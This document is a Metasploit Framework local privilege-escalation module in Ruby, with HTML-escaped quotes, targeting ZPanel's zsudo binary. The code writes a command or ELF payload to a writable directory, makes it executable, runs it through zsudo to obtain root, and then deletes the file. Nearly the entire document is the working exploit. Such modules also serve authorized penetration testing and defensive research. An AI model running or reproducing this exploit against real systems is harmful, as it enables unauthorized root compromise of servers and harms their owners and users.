# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
require &#039;rex&#039;
require &#039;msf/core/post/common&#039;
require &#039;msf/core/post/file&#039;
require &#039;msf/core/post/linux/priv&#039;
require &#039;msf/core/exploit/exe&#039;
 
 
class Metasploit4 < Msf::Exploit::Local
  Rank = ExcellentRanking
 
  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Post::Common
 
  def initialize(info={})
    super( update_info( info, {
        &#039;Name&#039;          => &#039;ZPanel zsudo Local Privilege Escalation Exploit&#039;,
        &#039;Description&#039;   => %q{
          This module abuses the zsudo binary, installed with zpanel, to escalate
          privileges. In order to work, a session with access to zsudo on the sudoers
          configuration is needed. This module is useful for post exploitation of ZPanel
          vulnerabilities, where typically web server privileges are acquired, and this
          user is allowed to execute zsudo on the sudoers file.
        },
        &#039;License&#039;       => MSF_LICENSE,
        &#039;Author&#039;        => [ &#039;sinn3r&#039;, &#039;juan vazquez&#039; ],
        &#039;DisclosureDate&#039; => &#039;Jun 07 2013&#039;,
        &#039;Platform&#039;      => [ &#039;unix&#039;, &#039;linux&#039;],
        &#039;Arch&#039;          => [ ARCH_CMD, ARCH_X86 ],
        &#039;Targets&#039;       =>
          [
            [ &#039;Command payload&#039;, { &#039;Arch&#039; => ARCH_CMD } ],
            [ &#039;Linux x86&#039;,       { &#039;Arch&#039; => ARCH_X86 } ]
          ],
        &#039;DefaultOptions&#039; => { "PrependSetresuid" => true, "WfsDelay" => 2 },
        &#039;DefaultTarget&#039; => 0,
      }
      ))
    register_options([
        # These are not OptPath becuase it&#039;s a *remote* path
        OptString.new("WritableDir", [ true, "A directory where we can write files", "/tmp" ]),
        OptString.new("zsudo",        [ true, "Path to zsudo executable", "/etc/zpanel/panel/bin/zsudo" ]),
      ], self.class)
  end
 
  def check
    if file?(datastore["zsudo"])
      return CheckCode::Detected
    end
 
    return CheckCode::Unknown
  end
 
  def exploit
    if (target.arch.include? ARCH_CMD)
      exe_file = "#{datastore["WritableDir"]}/#{rand_text_alpha(3 + rand(5))}.sh"
      # Using this way of writing the payload to avoid issues when failing to find
      # a command on the victim for writing binary data
      cmd_exec "echo \"#{payload.encoded.gsub(/"/, "\\\"")}\" > #{exe_file}"
    else
      exe_file = "#{datastore["WritableDir"]}/#{rand_text_alpha(3 + rand(5))}.elf"
      write_file(exe_file, generate_payload_exe)
    end
 
    cmd_exec "chmod +x #{exe_file}"
 
    print_status("Running...")
 
    begin
      cmd_exec "#{datastore["zsudo"]} #{exe_file} #{rand_text_alpha(3 + rand(5))}"
    ensure
      cmd_exec "rm -f #{exe_file}"
    end
 
  end
end

